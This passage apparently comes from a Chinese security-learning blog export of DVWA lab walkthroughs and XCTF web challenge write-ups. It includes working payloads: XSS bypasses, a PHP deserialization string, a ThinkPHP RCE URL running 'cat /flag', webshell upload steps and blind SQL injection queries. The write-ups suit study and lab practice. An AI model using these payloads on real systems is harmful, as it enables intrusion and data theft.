&#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close();&#125;?&gt; 感觉和Flected类型High级别的绕过方法差不多，不再赘述了。 DOMLow：查看服务器端源码： 12345&lt;?php# No protections, anything goes?&gt; 服务器端没有任何php源码，因此用户输入全由前端js处理 查看前端源码：![1](DVWA—DOM Based Cross Site Scripting (XSS)/1.png) 我们可以看到前端通过GET的方式获取参数default的值，因此我们在url栏构造payload![2](DVWA—DOM Based Cross Site Scripting (XSS)/2.png) 新函数： alert()函数 功能：用于显示带有一条指定消息和一个确定按钮的警告框。 语法：alert(message) 参数 描述 message 要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本） Medium：查看源码： 1234567891011121314&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; $default = $_GET[&#x27;default&#x27;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; 这道题搞了好久，一步一步来吧 1）先看网页源码： 2）尝试用之前学过的换标签的方式绕过：&lt;img src=1 oneeror=alert(1)&gt; 发现不会像之前一样有弹窗跳出来，原因是我们的代码被标签包裹了，因此我们尝试提前闭合 3）提前闭合option标签：&gt;&lt;/option&gt;&lt;img src=1 oneeror=alert(1)&gt; 弹窗还是没有跳出来，那么我们也提前闭合select标签 4）提前闭合select标签：&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 oneeror=alert(1)&gt; 弹窗又成功弹出 High：查看源码： 1234567891011121314151617181920&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; 我们可以看到服务器设立了白名单。这里我们就可以利用DOM型xss的数据不经过服务器的特点来绕过了。 构造payload：English#&lt;script&gt;alert(1)&lt;/script&gt; 由于服务器以get方式获取default的值，而浏览器不会把URL中#后的内容提交到服务器，因此我们可以完美绕过。","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"攻防世界web进阶","date":"2021-03-12T09:23:20.000Z","path":"2021/03/12/攻防世界web进阶2/","text":"NewsCenterWeb_php_unserialize：（反序列化）打开题目地址，就看到了源码 123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(&quot;index.php&quot;); &#125; ?&gt; 正则表达式：&#39;/[oc]:\\d+:/i&#39; /XXXX/ —— php的正则表达式需要放在// 之间 i ——修饰符，表示忽略大小写 [oc] ——匹配o和c: \\d ——匹配一个数字 \\d+ ——匹配多个数字 代码审计：服务器get获得var的值，先对var的值base64解码，然后正则匹配判断是否存在O：数字或C：数字，若不存在则在反序列之前执行__wakeup()魔术方法。 那么我们需要绕过正则匹配和__wakeup() O:+4:——绕过正则匹配 O:+4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}——把1换成2绕过__wakeup() 最后对payload进行base64encode，得：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 最后有一个问题没搞懂：“Demofile”只有8位，而前面字段却写了10，这是因为private型变量序列化之后会变成“\\x00 + 类名 + \\x00 + 变量名”形式。？？？？？？？？？？？？？？？？？？？ TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 错 TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 对 NaNNaNNaNNaN-Batman：（alert函数+代码审计）下载附件1web100.txt，打开发现是乱码 用浏览器打开，发现一个输入框 但是输入什么都没反应，查阅资料： eval函数，这是执行函数；这里执行了_变量中的内容(_等于$函数的内容,也就是单引号之间内容)，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来 整理得： 1234567891011121314151617181920function $()&#123;var e=document.getElementById(&quot;c&quot;).value;if(e.length==16)if(e.match(/^be0f23/)!=null)if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)if(e.match(/c7be9/)!=null)&#123;var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];var s=[t,n,r,i];for(var o=0;o&lt;13;++o)&#123; document.write(s[o%4][0]);s[o%4].splice(0,1)&#125; &#125; &#125; document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;);delete _ 新函数： splice() 功能：从数组中添加/删除项目，然后返回被删除的项目。 语法：arrayObject.splice(index,howmany,item1,.....,itemX) 参数 描述 index 必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。 howmany 必需。要删除的项目数量。如果设置为 0，则不会删除项目。 item1, …, itemX 可选。向数组添加的新项目。 法1：输入符合条件的e，令其执行后续代码 正则表达式： ^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa，其它的只要匹配到就好，没有位置要求于是我们构造e的值：be0f233ac7be98aa 在输入框内输入e的值： 法2：直接看后半段源码，循环推理也可得e的值。但是我感觉有点麻烦。 web2：（解码）点开题目地址： 发现这是一道解码题，只要解出miwen的值，就得到flag 新函数： strrev()函数： 功能：反转字符串。 语法：strrev(string) 参数 描述 string 必需。规定要反转的字符串。 ord()函数： 功能：以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值。即一个返回一个对应的十进制数。 语法：ord(c) char()函数： 功能：根据指定的 ASCII 值返回字符。（ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。） 语法：chr(ascii) 参数 描述 ascii 必需。ASCII 值。 str_rot13()函数： 功能：对字符串执行 ROT13 编码。ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。 语法：str_rot13(string) 参数 描述 string 必需。规定要编码的字符串。 sp：对字符串解码和编码都是同一个函数 代码审计：先反转字符串，然后对字符串每个字母对应的ascll码值加一，再找到加值对应的ascll码，把每个字符再拼接成一个字符串， 然后对该字符串依次进行base64编码、反转、 ROT13 编码，结果就是输出的miwen的值。 据此我们可以编写一段php代码进行解码： 12345678910111213141516171819&lt;?php$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;$_ = base64_decode(strrev(str_rot13($str)));$_o=null;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt; ics-05：（http://filter利用+preg_replace()函数漏洞利用）我们看到题目描述： 点开题目地址，找到设备维护中心 发现是文件包含，尝试用php://filter读取index.php源码：php://filter/read=convert.base64-encode/resource=index.php 对获得的字符串进行base64-decode，得： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta name&#x3D;&quot;renderer&quot; content&#x3D;&quot;webkit&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;layui&#x2F;css&#x2F;layui.css&quot; media&#x3D;&quot;all&quot;&gt; &lt;title&gt;设备维护中心&lt;&#x2F;title&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;ul class&#x3D;&quot;layui-nav&quot;&gt; &lt;li class&#x3D;&quot;layui-nav-item layui-this&quot;&gt;&lt;a href&#x3D;&quot;?page&#x3D;index&quot;&gt;云平台设备维护中心&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;fieldset class&#x3D;&quot;layui-elem-field layui-field-title&quot; style&#x3D;&quot;margin-top: 30px;&quot;&gt; &lt;legend&gt;设备列表&lt;&#x2F;legend&gt; &lt;&#x2F;fieldset&gt; &lt;table class&#x3D;&quot;layui-hide&quot; id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;table&gt; &lt;script type&#x3D;&quot;text&#x2F;html&quot; id&#x3D;&quot;switchTpl&quot;&gt; &lt;!-- 这里的 checked 的状态只是演示 --&gt; &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin&#x3D;&quot;switch&quot; lay-text&#x3D;&quot;开|关&quot; lay-filter&#x3D;&quot;checkDemo&quot; &#123;&#123; d.id&#x3D;&#x3D;1 0003 ? &#39;checked&#39; : &#39;&#39; &#125;&#125;&gt; &lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;layui&#x2F;layui.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; layui.use(&#39;table&#39;, function() &#123; var table &#x3D; layui.table, form &#x3D; layui.form; table.render(&#123; elem: &#39;#test&#39;, url: &#39;&#x2F;somrthing.json&#39;, cellMinWidth: 80, cols: [ [ &#123; type: &#39;numbers&#39; &#125;, &#123; type: &#39;checkbox&#39; &#125;, &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;, &#123; field: &#39;name&#39;, title: &#39;设备名&#39;, templet: &#39;#nameTpl&#39; &#125;, &#123; field: &#39;area&#39;, title: &#39;区域&#39; &#125;, &#123; field: &#39;status&#39;, title: &#39;维护状态&#39;, minWidth: 120, sort: true &#125;, &#123; field: &#39;check&#39;, title: &#39;设备开关&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;&#x2F;script&gt; &lt;script&gt; layui.use(&#39;element&#39;, function() &#123; var element &#x3D; layui.element; &#x2F;&#x2F;导航的hover效果、二级菜单等功能，需要依赖element模块 &#x2F;&#x2F;监听导航点击 element.on(&#39;nav(demo)&#39;, function(elem) &#123; &#x2F;&#x2F;console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;&#x2F;script&gt;&lt;?php$page &#x3D; $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt; &lt;div style&#x3D;&quot;text-align:center&quot;&gt; &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;&#x2F;p&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;?php&#125;else&#123;?&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt; &lt;div style&#x3D;&quot;text-align:center&quot;&gt; &lt;p class&#x3D;&quot;lead&quot;&gt; &lt;?php if (strpos($page, &#39;input&#39;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#39;text&#39;) &gt; 0) &#123; die(); &#125; if ($page &#x3D;&#x3D;&#x3D; &#39;index.php&#39;) &#123; die(&#39;Ok&#39;); &#125; include($page); die(); ?&gt; &lt;&#x2F;p&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;?php&#125;&#125;&#x2F;&#x2F;方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern &#x3D; $_GET[pat]; $replacement &#x3D; $_GET[rep]; $subject &#x3D; $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 其中最关键的代码内容： 1234567891011121314151617181920212223&lt;?php&#125;&#125;&#x2F;&#x2F;方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern &#x3D; $_GET[pat]; $replacement &#x3D; $_GET[rep]; $subject &#x3D; $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 代码审计：当服务器收到来自ip=127.0.0.1的访问请求时，会认为其是管理员。此时可以伴随上传三个参数，作为preg_replace()函数的变量。 学习： preg_replace()函数危险的/e修饰符（https://www.jb51.net/article/38714.htm） 说明：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 preg_replace($pattern, $replacement, $subject)作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。$pattern: 要搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组。","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"攻防世界web进阶","date":"2021-03-12T09:23:20.000Z","path":"2021/03/12/攻防世界web进阶1/","text":"baby_web我们点击题目场景，发现跳转到1.php 查阅资料发现一般网站的初始页面都是index.php，于是在url中输入index.php，但是又自动跳转到1.php。 F12进入开发者模式，查看网络模块： 我们可以看到flag就在其中，同时发现网页跳转的原因就是location指向文件1.php。 sp：location——用于重定向一个新的位置，包含一个新的url。表示用户应当到指定地址提取文件。 Training-WWW-Robots本题主要考察对robots.txt的了解和作用。 robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它 。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。Robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 打开题目地址，看到这是一个对robots.txt的简介 访问一下这个网站的robots.txt 网站不让我们访问这个fl0g.php，那我们就偏访问 ​ 发现flag，收工 php_rce没搞懂 http://111.200.241.244:42333/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag php2进入题目页面 查看网页源码、回显都没有什么线索，查阅资料得知我们可以通过phps查看php源码。 phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。 查看该页面源码： 代码审计可知，当id=admin时不会爆flag，但是当admin经过编码后可得flag 由于本关url解码了两次（浏览器上传服务器一次，urldecode函数一次），因此我们可以构造?id=%2561dmin ics-06: 我们根据题目提示打开报表中心 我们可以看到id=1，那会不会是参数有问题呢 用burp抓包，对id进行爆破，发现当id=2333时爆出flag 但是这题有一点不明白，就是为什么题目说：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。为什么痕迹是id的值？ Web_php_include参考https://blog.csdn.net/weixin_45844670/article/details/108180309 warmup参考https://blog.csdn.net/yybzzz/article/details/104971608 unserialize3恶补了一下反序列化操作与序列序列化操作。参考资料：https://www.freebuf.com/articles/web/167721.html https://blog.csdn.net/weixin_44677409/article/details/93884388 我这边就简单的概括一下： 序列化——将变量或对象转换成字符串的过程。 反序列化——将字符串转换成变量或对象的过程。 如图序列化后! 魔术方法（）： _construct()：创建对象时初始化_destruction()：结束时销毁对象_toString()：对象被当作字符串时使用_sleep()：序列化对象之前调用_wakeup()：反序列化对象之前调用_call()：调用对象不存在时使用_get()：调用私有属性时使用 注： 1.的魔术方法必须声明为 public 2.public属性序列化后格式为：数据类型:属性名长度:”属性名”。 了解了上述这些我们就可以开始答题啦 我们看到wakeup()函数，再结合题目unseriasize3可以得知这是一道反序列化操作的题， 根据前两行代码可知存在一个数组名xctf，键数1，键名flag，键值111的数组， 在__wakeup()魔术方法中，在反序列化前会自动调用 _wakeup方法，强制输出bad requests，因此我们要绕过之 解题关键：当序列化字符串中表示对象属性个数（键数）的值大于实际的属性个数（键数）时会跳过__wakeup的执行 构造字符串?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;绕过__wakeup方法 supersqli打开题目地址发现是SQL注入的题，先拿sqlmap跑了一下，发现只能跑出数据库名，再下去就跑不动了，于是只能回来乖乖手工注入。 输入1&#39;报错 输入1&#39; and &#39;1&#39;=&#39;1，正常； 输入1&#39; and &#39;1&#39;=&#39;2，异常； 因此注入类型为&#39;。 尝试union联合注入，发现过滤了许多单词 因此避免使用含select语句的方式好像也只有堆叠注入了 参考博客：https://blog.csdn.net/rfrder/article/details/108583338","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"DVWA—Weak Session IDs","date":"2021-03-12T08:50:01.000Z","path":"2021/03/12/DVWA—Weak Session IDs/","text":"前言：Weak Session IDs：密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。SessionID一旦在生命周期内被窃取，就等同于账户失窃。同时由于SessionID是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。————————————————版权声明：摘自为CSDN博主「baynk」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/u014029795/article/details/102795784","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—File Uplod","date":"2021-03-12T02:37:19.000Z","path":"2021/03/12/DVWA—File Uplod/","text":"前言：之前刷过upload就不多说了 Low：查看源码： 12345678910111213141516171819&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 我们可以看到服务器对上传文件的类型、内容没有做任何检查、过滤，那么我们上传webshell.php，连接蚁剑，即可控制整个服务器。 ![1](DVWA—File Uplod/1.png) Medium：查看源码： 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 我们可以看到，服务器对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 法一：搭配文件包含漏洞 我们上传文件名为webshell.png，内容为一句话木马，然后利用文件包含漏洞的特性，借助Medium级别的文件包含漏洞来获取webshell权限。用蚁剑连接：http://localhost:81/vulnerabilities/fi/?page=hthttp://tp://localhost:81/hackable/uploads/webshell.png，但是发现连接失败，返回内容为空。原来，蚁剑在连接时并没有携带cookie，正因为缺少cookie值才无法连接成功。 解决方法就是添加cookie，具体请看：https://blog.csdn.net/qq_39174983/article/details/111983259?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161426249816780261924019%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161426249816780261924019&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111983259.pc_search_result_no_baidu_js&amp;utm_term=DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EHigh 法二：抓包修改 我们先上传webshell.png，内容为一句话木马，然后抓包，修改文件名后缀为php ![2](DVWA—File Uplod/2.png) 蚁剑连接即可 ![1](DVWA—File Uplod/1.png) High：查看源码： 1234567891011121314151617181920212223242526272829303132333435&lt;&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 我们可以看到服务器这次检查了文件名后缀，设置了白名单，并且getimagesize函数检查了文件头内容。 我们可以利用图片马搭配文件包含漏洞完成绕过。具体步骤和Medium级别的一句话木马上传没有什么差别。","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—SQL Injection (Blind)","date":"2021-03-10T08:48:00.000Z","path":"2021/03/10/DVWA—SQL Injection (Blind)/","text":"前言：SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行的结果，甚至连注入语句是否执行都无法得知。 Low：1）判断注入点即其类型 1’ and ‘1’=’1![2](DVWA—SQL Injection (Blind)/2.png) 1’ and ‘1’=’2![1](DVWA—SQL Injection (Blind)/1.png) 可知存在注入点，且注入类型为&#39; 2）猜测SQL查询语句的字段数 1’ order by 2#![2](DVWA—SQL Injection (Blind)/2.png) 1’ order by 3#![1](DVWA—SQL Injection (Blind)/1.png) 3）爆库 1’ and length(database())=1 # ，不存在 1’ and length(database())=2 # ，不存在 1’ and length(database())=3 # ，不存在 1’ and length(database())=4 # ，存在，因此库名长度为四 1’ and left(database(),1)=’d’#，存在，一次库名的首字母为d，剩下的一次类推，得库名为dvwa 4）爆表 先猜表个数 1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #，存在，即有两个表 猜表名长度 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，存在，第一个表名有9个字母 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 # 存在，第二个表名有5个字母 猜表名组成字符 1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)=’u’ #，存在，说明第二个表的表名首字母为u，以此类推可得第二个表表名为users 5）爆列 爆列和爆表基本相似，仅需稍微修改一点即可，下面就举猜表个数为例，其余自行变通。 1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=14 #，存在，说明有14个列 6）爆值 爆值手动操作量太大了，这里就以爆列：user为例 1’ and substr((select user from users limit 0,1),1,1)=’a’# 查看源码： 12345678910111213141516171819202122232425262728?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT 